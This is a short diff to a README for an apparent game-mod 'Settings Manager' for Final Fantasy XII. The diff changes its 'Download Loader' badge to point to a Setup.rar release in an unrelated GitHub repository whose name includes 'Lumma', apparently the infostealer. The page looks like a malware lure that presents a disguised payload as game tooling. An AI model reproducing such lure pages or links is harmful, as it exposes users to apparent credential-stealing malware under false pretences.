@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Final Fantasy XII: The Zodiac Age Settings Manager
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
 
 ---
 
@@ -38,6 +38,7 @@ configs/
 `Final-Fantasy-XII-The-Zodiac-Age-Settings-Manager` · Updated: 2026-10-28
 
 **Tags:** `final-fantasy-xii-the-zodiac-age` `settings-manager` `rpg` `character-builds` `quest-tracking` `windows` `steam`
+
 
 
 
